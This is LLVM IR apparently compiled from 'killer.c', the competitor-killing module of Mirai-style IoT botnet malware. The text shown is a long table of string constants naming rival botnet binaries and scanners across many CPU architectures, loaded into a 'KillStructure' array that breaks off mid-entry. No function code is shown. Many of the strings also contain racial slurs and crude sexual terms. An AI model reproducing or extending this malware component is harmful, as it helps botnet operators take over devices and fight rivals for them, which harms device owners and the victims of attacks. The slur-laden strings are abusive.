; ModuleID = 'killer.c'
source_filename = "killer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.dirent = type { i64, i64, i16, i8, [256 x i8] }
%struct.__dirstream = type opaque

@.str = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"BzSxLxBxeY\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"HOHO-LUGO7\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"HOHO-U79OL\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"JuYfouyf87\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"NiGGeR69xd\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"SO190Ij1X\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"LOLKIKEEEDDE\00", align 1
@.str.8 = private unnamed_addr constant [12 x i8] c"ekjheory98e\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"scansh4\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"MDMA\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"fdevalvex\00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"scanspc\00", align 1
@.str.13 = private unnamed_addr constant [17 x i8] c"MELTEDNINJAREALZ\00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"flexsonskids\00", align 1
@.str.15 = private unnamed_addr constant [8 x i8] c"scanx86\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"MISAKI-U79OL\00", align 1
@.str.17 = private unnamed_addr constant [12 x i8] c"foAxi102kxe\00", align 1
@.str.18 = private unnamed_addr constant [13 x i8] c"swodjwodjwoj\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"MmKiy7f87l\00", align 1
@.str.20 = private unnamed_addr constant [14 x i8] c"freecookiex86\00", align 1
@.str.21 = private unnamed_addr constant [7 x i8] c"sysgpu\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c"frgege\00", align 1
@.str.23 = private unnamed_addr constant [11 x i8] c"sysupdater\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"0DnAzepd\00", align 1
@.str.25 = private unnamed_addr constant [14 x i8] c"NiGGeRD0nks69\00", align 1
@.str.26 = private unnamed_addr constant [7 x i8] c"frgreu\00", align 1
@.str.27 = private unnamed_addr constant [11 x i8] c"0x766f6964\00", align 1
@.str.28 = private unnamed_addr constant [16 x i8] c"NiGGeRd0nks1337\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"gaft\00", align 1
@.str.30 = private unnamed_addr constant [13 x i8] c"urasgbsigboa\00", align 1
@.str.31 = private unnamed_addr constant [10 x i8] c"120i3UI49\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"OaF3\00", align 1
@.str.33 = private unnamed_addr constant [5 x i8] c"geae\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"vaiolmao\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123123a\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"Ofurain0n4H34D\00", align 1
@.str.37 = private unnamed_addr constant [7 x i8] c"ggTrex\00", align 1
@.str.38 = private unnamed_addr constant [3 x i8] c"ew\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"wasads\00", align 1
@.str.40 = private unnamed_addr constant [12 x i8] c"1293194hjXD\00", align 1
@.str.41 = private unnamed_addr constant [10 x i8] c"OthLaLosn\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"ggt\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"wget-log\00", align 1
@.str.44 = private unnamed_addr constant [15 x i8] c"1337SoraLOADER\00", align 1
@.str.45 = private unnamed_addr constant [9 x i8] c"SAIAKINA\00", align 1
@.str.46 = private unnamed_addr constant [5 x i8] c"ggtq\00", align 1
@.str.47 = private unnamed_addr constant [17 x i8] c"1378bfp919GRB1Q2\00", align 1
@.str.48 = private unnamed_addr constant [9 x i8] c"SAIAKUSO\00", align 1
@.str.49 = private unnamed_addr constant [5 x i8] c"ggtr\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"14Fa\00", align 1
@.str.51 = private unnamed_addr constant [13 x i8] c"SEXSLAVE1337\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"ggtt\00", align 1
@.str.53 = private unnamed_addr constant [15 x i8] c"1902a3u912u3u4\00", align 1
@.str.54 = private unnamed_addr constant [10 x i8] c"haetrghbr\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"19ju3d\00", align 1
@.str.56 = private unnamed_addr constant [12 x i8] c"SORAojkf120\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"hehahejeje92\00", align 1
@.str.58 = private unnamed_addr constant [14 x i8] c"2U2JDJA901F91\00", align 1
@.str.59 = private unnamed_addr constant [10 x i8] c"SlaVLav12\00", align 1
@.str.60 = private unnamed_addr constant [17 x i8] c"helpmedaddthhhhh\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"2wgg9qphbq\00", align 1
@.str.62 = private unnamed_addr constant [18 x i8] c"Slav3Th3seD3vices\00", align 1
@.str.63 = private unnamed_addr constant [11 x i8] c"hzSmYZjYMQ\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"5Gbf\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"sora\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"SoRAxD123LOL\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"iaGv\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"5aA3\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"SoRAxD420LOL\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"insomni\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"640277\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"SoraBeReppin1337\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"ipcamCache\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"66tlGg9Q\00", align 1
@.str.75 = private unnamed_addr constant [11 x i8] c"jUYfouyf87\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"6ke3\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"TOKYO3\00", align 1
@.str.78 = private unnamed_addr constant [17 x i8] c"lyEeaXul2dULCVxh\00", align 1
@.str.79 = private unnamed_addr constant [10 x i8] c"93OfjHZ2z\00", align 1
@.str.80 = private unnamed_addr constant [17 x i8] c"TY2gD6MZvKc7KU6r\00", align 1
@.str.81 = private unnamed_addr constant [11 x i8] c"mMkiy6f87l\00", align 1
@.str.82 = private unnamed_addr constant [14 x i8] c"A023UU4U24UIU\00", align 1
@.str.83 = private unnamed_addr constant [10 x i8] c"TheWeeknd\00", align 1
@.str.84 = private unnamed_addr constant [13 x i8] c"mioribitches\00", align 1
@.str.85 = private unnamed_addr constant [5 x i8] c"A5p9\00", align 1
@.str.86 = private unnamed_addr constant [11 x i8] c"TheWeeknds\00", align 1
@.str.87 = private unnamed_addr constant [10 x i8] c"mnblkjpoi\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"AbAd\00", align 1
@.str.89 = private unnamed_addr constant [7 x i8] c"Tokyos\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"neb\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"Akiru\00", align 1
@.str.92 = private unnamed_addr constant [7 x i8] c"U8inTz\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"netstats\00", align 1
@.str.94 = private unnamed_addr constant [5 x i8] c"Alex\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"W9RCAKM20T\00", align 1
@.str.96 = private unnamed_addr constant [11 x i8] c"newnetword\00", align 1
@.str.97 = private unnamed_addr constant [7 x i8] c"Ayo215\00", align 1
@.str.98 = private unnamed_addr constant [5 x i8] c"Word\00", align 1
@.str.99 = private unnamed_addr constant [7 x i8] c"nloads\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"BAdAsV\00", align 1
@.str.101 = private unnamed_addr constant [9 x i8] c"Wordmane\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"notyakuzaa\00", align 1
@.str.103 = private unnamed_addr constant [6 x i8] c"Belch\00", align 1
@.str.104 = private unnamed_addr constant [9 x i8] c"Wordnets\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"obp\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"BigN0gg0r420\00", align 1
@.str.107 = private unnamed_addr constant [10 x i8] c"X0102I34f\00", align 1
@.str.108 = private unnamed_addr constant [14 x i8] c"ofhasfhiafhoi\00", align 1
@.str.109 = private unnamed_addr constant [14 x i8] c"X19I239124UIU\00", align 1
@.str.110 = private unnamed_addr constant [5 x i8] c"oism\00", align 1
@.str.111 = private unnamed_addr constant [9 x i8] c"Deported\00", align 1
@.str.112 = private unnamed_addr constant [14 x i8] c"XSHJEHHEIIHWO\00", align 1
@.str.113 = private unnamed_addr constant [10 x i8] c"olsVNwo12\00", align 1
@.str.114 = private unnamed_addr constant [17 x i8] c"DeportedDeported\00", align 1
@.str.115 = private unnamed_addr constant [11 x i8] c"XkTer0GbA1\00", align 1
@.str.116 = private unnamed_addr constant [9 x i8] c"onry0v03\00", align 1
@.str.117 = private unnamed_addr constant [17 x i8] c"FortniteDownLOLZ\00", align 1
@.str.118 = private unnamed_addr constant [11 x i8] c"Y0urM0mGay\00", align 1
@.str.119 = private unnamed_addr constant [16 x i8] c"pussyfartlmaojk\00", align 1
@.str.120 = private unnamed_addr constant [15 x i8] c"GrAcEnIgGeRaNn\00", align 1
@.str.121 = private unnamed_addr constant [11 x i8] c"YvdGkqndCO\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"qGeoRBe6BE\00", align 1
@.str.123 = private unnamed_addr constant [12 x i8] c"GuiltyCrown\00", align 1
@.str.124 = private unnamed_addr constant [7 x i8] c"ZEuS69\00", align 1
@.str.125 = private unnamed_addr constant [11 x i8] c"s4beBsEQhd\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"HOHO-KSNDO\00", align 1
@.str.127 = private unnamed_addr constant [7 x i8] c"ZEuz69\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"sat1234\00", align 1
@.str.129 = private unnamed_addr constant [9 x i8] c"aj93hJ23\00", align 1
@.str.130 = private unnamed_addr constant [7 x i8] c"scanHA\00", align 1
@.str.131 = private unnamed_addr constant [13 x i8] c"alie293z0k2L\00", align 1
@.str.132 = private unnamed_addr constant [13 x i8] c"scanJoshoARM\00", align 1
@.str.133 = private unnamed_addr constant [11 x i8] c"HellInSide\00", align 1
@.str.134 = private unnamed_addr constant [13 x i8] c"ayyyGangShit\00", align 1
@.str.135 = private unnamed_addr constant [14 x i8] c"scanJoshoARM5\00", align 1
@.str.136 = private unnamed_addr constant [8 x i8] c"HighFry\00", align 1
@.str.137 = private unnamed_addr constant [5 x i8] c"b1gl\00", align 1
@.str.138 = private unnamed_addr constant [14 x i8] c"scanJoshoARM6\00", align 1
@.str.139 = private unnamed_addr constant [11 x i8] c"IWhPyucDbJ\00", align 1
@.str.140 = private unnamed_addr constant [9 x i8] c"boatnetz\00", align 1
@.str.141 = private unnamed_addr constant [14 x i8] c"scanJoshoARM7\00", align 1
@.str.142 = private unnamed_addr constant [11 x i8] c"IuYgujeIqn\00", align 1
@.str.143 = private unnamed_addr constant [10 x i8] c"btbatrtah\00", align 1
@.str.144 = private unnamed_addr constant [14 x i8] c"scanJoshoM68K\00", align 1
@.str.145 = private unnamed_addr constant [13 x i8] c"JJDUHEWBBBIB\00", align 1
@.str.146 = private unnamed_addr constant [14 x i8] c"scanJoshoMIPS\00", align 1
@.str.147 = private unnamed_addr constant [14 x i8] c"JSDGIEVIVAVIG\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"cKbVkzGOPa\00", align 1
@.str.149 = private unnamed_addr constant [14 x i8] c"scanJoshoMPSL\00", align 1
@.str.150 = private unnamed_addr constant [5 x i8] c"ccAD\00", align 1
@.str.151 = private unnamed_addr constant [13 x i8] c"scanJoshoPPC\00", align 1
@.str.152 = private unnamed_addr constant [12 x i8] c"KAZEN-OIU97\00", align 1
@.str.153 = private unnamed_addr constant [13 x i8] c"chickenxings\00", align 1
@.str.154 = private unnamed_addr constant [13 x i8] c"scanJoshoSH4\00", align 1
@.str.155 = private unnamed_addr constant [10 x i8] c"yakuskzm8\00", align 1
@.str.156 = private unnamed_addr constant [12 x i8] c"KAZEN-PO78H\00", align 1
@.str.157 = private unnamed_addr constant [8 x i8] c"cleaner\00", align 1
@.str.158 = private unnamed_addr constant [13 x i8] c"scanJoshoSPC\00", align 1
@.str.159 = private unnamed_addr constant [12 x i8] c"KAZEN-U79OL\00", align 1
@.str.160 = private unnamed_addr constant [6 x i8] c"dbeef\00", align 1
@.str.161 = private unnamed_addr constant [13 x i8] c"scanJoshoX86\00", align 1
@.str.162 = private unnamed_addr constant [10 x i8] c"yakuz4c24\00", align 1
@.str.163 = private unnamed_addr constant [10 x i8] c"KETASHI32\00", align 1
@.str.164 = private unnamed_addr constant [10 x i8] c"ddrwelper\00", align 1
@.str.165 = private unnamed_addr constant [9 x i8] c"scanarm5\00", align 1
@.str.166 = private unnamed_addr constant [11 x i8] c"zPnr6HpQj2\00", align 1
@.str.167 = private unnamed_addr constant [13 x i8] c"Kaishi-Iz90Y\00", align 1
@.str.168 = private unnamed_addr constant [7 x i8] c"deexec\00", align 1
@.str.169 = private unnamed_addr constant [9 x i8] c"scanarm6\00", align 1
@.str.170 = private unnamed_addr constant [10 x i8] c"zdrtfxcgy\00", align 1
@.str.171 = private unnamed_addr constant [10 x i8] c"Katrina32\00", align 1
@.str.172 = private unnamed_addr constant [9 x i8] c"doCP3fVj\00", align 1
@.str.173 = private unnamed_addr constant [9 x i8] c"scanarm7\00", align 1
@.str.174 = private unnamed_addr constant [9 x i8] c"zxcfhuio\00", align 1
@.str.175 = private unnamed_addr constant [11 x i8] c"Ksif91je39\00", align 1
@.str.176 = private unnamed_addr constant [9 x i8] c"scanm68k\00", align 1
@.str.177 = private unnamed_addr constant [6 x i8] c"Kuasa\00", align 1
@.str.178 = private unnamed_addr constant [10 x i8] c"dvrhelper\00", align 1
@.str.179 = private unnamed_addr constant [9 x i8] c"scanmips\00", align 1
@.str.180 = private unnamed_addr constant [14 x i8] c"KuasaBinsMate\00", align 1
@.str.181 = private unnamed_addr constant [11 x i8] c"eQnOhRk85r\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"scanmpsl\00", align 1
@.str.183 = private unnamed_addr constant [14 x i8] c"LOLHHHOHOHBUI\00", align 1
@.str.184 = private unnamed_addr constant [11 x i8] c"eXK20CL12Z\00", align 1
@.str.185 = private unnamed_addr constant [4 x i8] c"nya\00", align 1
@.str.186 = private unnamed_addr constant [5 x i8] c"mezy\00", align 1
@.str.187 = private unnamed_addr constant [16 x i8] c"QBotBladeSPOOKY\00", align 1
@.str.188 = private unnamed_addr constant [14 x i8] c"hikariwashere\00", align 1
@.str.189 = private unnamed_addr constant [11 x i8] c"p4029x91xx\00", align 1
@.str.190 = private unnamed_addr constant [12 x i8] c"32uhj4gbejh\00", align 1
@.str.191 = private unnamed_addr constant [4 x i8] c"zhr\00", align 1
@.str.192 = private unnamed_addr constant [6 x i8] c"a.out\00", align 1
@.str.193 = private unnamed_addr constant [5 x i8] c"lzrd\00", align 1
@.str.194 = private unnamed_addr constant [17 x i8] c"PownedSecurity69\00", align 1
@.str.195 = private unnamed_addr constant [6 x i8] c".ares\00", align 1
@.str.196 = private unnamed_addr constant [11 x i8] c"fxlyazsxhy\00", align 1
@.str.197 = private unnamed_addr constant [12 x i8] c"jnsd9sdoila\00", align 1
@.str.198 = private unnamed_addr constant [13 x i8] c"yourmomgaeis\00", align 1
@.str.199 = private unnamed_addr constant [13 x i8] c"sdfjiougsioj\00", align 1
@.str.200 = private unnamed_addr constant [6 x i8] c"Oasis\00", align 1
@.str.201 = private unnamed_addr constant [22 x i8] c"SEGRJIJHFVNHSNHEIHFOS\00", align 1
@.str.202 = private unnamed_addr constant [8 x i8] c"apep999\00", align 1
@.str.203 = private unnamed_addr constant [13 x i8] c"KOWAI-BAdAsV\00", align 1
@.str.204 = private unnamed_addr constant [10 x i8] c"KOWAI-SAD\00", align 1
@.str.205 = private unnamed_addr constant [10 x i8] c"jHKipU7Yl\00", align 1
@.str.206 = private unnamed_addr constant [15 x i8] c"airdropmalware\00", align 1
@.str.207 = private unnamed_addr constant [23 x i8] c"your_verry_fucking_gay\00", align 1
@.str.208 = private unnamed_addr constant [15 x i8] c"Big-Bro-Bright\00", align 1
@.str.209 = private unnamed_addr constant [9 x i8] c"sefaexec\00", align 1
@.str.210 = private unnamed_addr constant [10 x i8] c"shirololi\00", align 1
@.str.211 = private unnamed_addr constant [7 x i8] c"eagle.\00", align 1
@.str.212 = private unnamed_addr constant [13 x i8] c"For-Gai-Mezy\00", align 1
@.str.213 = private unnamed_addr constant [8 x i8] c"0x6axNL\00", align 1
@.str.214 = private unnamed_addr constant [15 x i8] c"cloqkisvspooky\00", align 1
@.str.215 = private unnamed_addr constant [5 x i8] c"myth\00", align 1
@.str.216 = private unnamed_addr constant [11 x i8] c"SwergjmioG\00", align 1
@.str.217 = private unnamed_addr constant [26 x i8] c"KILLEJW(IU(JIWERGFJGJWJRG\00", align 1
@.str.218 = private unnamed_addr constant [6 x i8] c"Hetrh\00", align 1
@.str.219 = private unnamed_addr constant [8 x i8] c"wewrthe\00", align 1
@.str.220 = private unnamed_addr constant [11 x i8] c"IuFdKssCxz\00", align 1
@.str.221 = private unnamed_addr constant [10 x i8] c"jSDFJIjio\00", align 1
@.str.222 = private unnamed_addr constant [11 x i8] c"OnrYoXd666\00", align 1
@.str.223 = private unnamed_addr constant [12 x i8] c"ewrtkjoketh\00", align 1
@.str.224 = private unnamed_addr constant [13 x i8] c"ajbdf89wu823\00", align 1
@.str.225 = private unnamed_addr constant [10 x i8] c"AAaasrdgs\00", align 1
@.str.226 = private unnamed_addr constant [10 x i8] c"WsGA4@F6F\00", align 1
@.str.227 = private unnamed_addr constant [16 x i8] c"GhostWuzHere666\00", align 1
@.str.228 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.229 = private unnamed_addr constant [11 x i8] c"sfc6aJfIuY\00", align 1
@.str.230 = private unnamed_addr constant [7 x i8] c"Demon.\00", align 1
@.str.231 = private unnamed_addr constant [12 x i8] c"xeno-is-god\00", align 1
@.str.232 = private unnamed_addr constant [12 x i8] c"ICY-P-0ODIJ\00", align 1
@.str.233 = private unnamed_addr constant [10 x i8] c"gSHUIHIfh\00", align 1
@.str.234 = private unnamed_addr constant [5 x i8] c"wrgL\00", align 1
@.str.235 = private unnamed_addr constant [11 x i8] c"hu87VhvQPz\00", align 1
@.str.236 = private unnamed_addr constant [12 x i8] c"dakuexecbin\00", align 1
@.str.237 = private unnamed_addr constant [14 x i8] c"TacoBellGodYo\00", align 1
@.str.238 = private unnamed_addr constant [9 x i8] c"loligang\00", align 1
@.str.239 = private unnamed_addr constant [10 x i8] c"Execution\00", align 1
@.str.240 = private unnamed_addr constant [12 x i8] c"orbitclient\00", align 1
@.str.241 = private unnamed_addr constant [8 x i8] c"Amnesia\00", align 1
@.str.242 = private unnamed_addr constant [6 x i8] c"Owari\00", align 1
@.str.243 = private unnamed_addr constant [9 x i8] c"UnHAnaAW\00", align 1
@.str.244 = private unnamed_addr constant [6 x i8] c"z3hir\00", align 1
@.str.245 = private unnamed_addr constant [5 x i8] c"obbo\00", align 1
@.str.246 = private unnamed_addr constant [6 x i8] c"miori\00", align 1
@.str.247 = private unnamed_addr constant [6 x i8] c"eagle\00", align 1
@.str.248 = private unnamed_addr constant [11 x i8] c"doxxRollie\00", align 1
@.str.249 = private unnamed_addr constant [8 x i8] c"lessie.\00", align 1
@.str.250 = private unnamed_addr constant [5 x i8] c"hax.\00", align 1
@.str.251 = private unnamed_addr constant [7 x i8] c"yakuza\00", align 1
@.str.252 = private unnamed_addr constant [10 x i8] c"wordminer\00", align 1
@.str.253 = private unnamed_addr constant [10 x i8] c"minerword\00", align 1
@.str.254 = private unnamed_addr constant [8 x i8] c"SinixV4\00", align 1
@.str.255 = private unnamed_addr constant [5 x i8] c"hoho\00", align 1
@.str.256 = private unnamed_addr constant [9 x i8] c"g0dbu7tu\00", align 1
@.str.257 = private unnamed_addr constant [7 x i8] c"orphic\00", align 1
@.str.258 = private unnamed_addr constant [9 x i8] c"furasshu\00", align 1
@.str.259 = private unnamed_addr constant [8 x i8] c"horizon\00", align 1
@.str.260 = private unnamed_addr constant [10 x i8] c"assailant\00", align 1
@.str.261 = private unnamed_addr constant [5 x i8] c"Ares\00", align 1
@.str.262 = private unnamed_addr constant [13 x i8] c"Kawaiihelper\00", align 1
@.str.263 = private unnamed_addr constant [8 x i8] c"ECHOBOT\00", align 1
@.str.264 = private unnamed_addr constant [7 x i8] c"DEMONS\00", align 1
@.str.265 = private unnamed_addr constant [6 x i8] c"kalon\00", align 1
@.str.266 = private unnamed_addr constant [6 x i8] c"Josho\00", align 1
@.str.267 = private unnamed_addr constant [10 x i8] c"daddyscum\00", align 1
@.str.268 = private unnamed_addr constant [9 x i8] c"akira.ak\00", align 1
@.str.269 = private unnamed_addr constant [6 x i8] c"Hilix\00", align 1
@.str.270 = private unnamed_addr constant [5 x i8] c"daku\00", align 1
@.str.271 = private unnamed_addr constant [8 x i8] c"Tsunami\00", align 1
@.str.272 = private unnamed_addr constant [8 x i8] c"estella\00", align 1
@.str.273 = private unnamed_addr constant [6 x i8] c"Solar\00", align 1
@.str.274 = private unnamed_addr constant [5 x i8] c"rift\00", align 1
@.str.275 = private unnamed_addr constant [10 x i8] c"_-255.Net\00", align 1
@.str.276 = private unnamed_addr constant [8 x i8] c"Cayosin\00", align 1
@.str.277 = private unnamed_addr constant [6 x i8] c"Okami\00", align 1
@.str.278 = private unnamed_addr constant [6 x i8] c"Kosha\00", align 1
@.str.279 = private unnamed_addr constant [8 x i8] c"bushido\00", align 1
@.str.280 = private unnamed_addr constant [7 x i8] c"trojan\00", align 1
@.str.281 = private unnamed_addr constant [7 x i8] c"shiina\00", align 1
@.str.282 = private unnamed_addr constant [8 x i8] c"Reaper.\00", align 1
@.str.283 = private unnamed_addr constant [8 x i8] c"Corona.\00", align 1
@.str.284 = private unnamed_addr constant [11 x i8] c"wrgnuwrijo\00", align 1
@.str.285 = private unnamed_addr constant [4 x i8] c"Aka\00", align 1
@.str.286 = private unnamed_addr constant [5 x i8] c"Hari\00", align 1
@.str.287 = private unnamed_addr constant [6 x i8] c"orage\00", align 1
@.str.288 = private unnamed_addr constant [6 x i8] c"fibre\00", align 1
@.str.289 = private unnamed_addr constant [6 x i8] c"galil\00", align 1
@.str.290 = private unnamed_addr constant [11 x i8] c"stresserpw\00", align 1
@.str.291 = private unnamed_addr constant [12 x i8] c"stresser.pw\00", align 1
@.str.292 = private unnamed_addr constant [6 x i8] c"Tohru\00", align 1
@.str.293 = private unnamed_addr constant [5 x i8] c"Omni\00", align 1
@.str.294 = private unnamed_addr constant [7 x i8] c"kawaii\00", align 1
@.str.295 = private unnamed_addr constant [7 x i8] c"Frosti\00", align 1
@.str.296 = private unnamed_addr constant [9 x i8] c"sxj472sz\00", align 1
@.str.297 = private unnamed_addr constant [10 x i8] c"HU6FIZTQU\00", align 1
@.str.298 = private unnamed_addr constant [10 x i8] c"PFF1500RG\00", align 1
@.str.299 = private unnamed_addr constant [15 x i8] c"plzjustfuckoff\00", align 1
@.str.300 = private unnamed_addr constant [7 x i8] c"nvitpj\00", align 1
@.str.301 = private unnamed_addr constant [8 x i8] c"elfLoad\00", align 1
@.str.302 = private unnamed_addr constant [8 x i8] c"Amakano\00", align 1
@.str.303 = private unnamed_addr constant [11 x i8] c"tokupdater\00", align 1
@.str.304 = private unnamed_addr constant [9 x i8] c"cum-n-go\00", align 1
@.str.305 = private unnamed_addr constant [9 x i8] c"oblivion\00", align 1
@.str.306 = private unnamed_addr constant [8 x i8] c"Voltage\00", align 1
@.str.307 = private unnamed_addr constant [8 x i8] c"scanppc\00", align 1
@.str.308 = private unnamed_addr constant [3 x i8] c"./\00", align 1
@KillStructure = dso_local global [321 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.59, 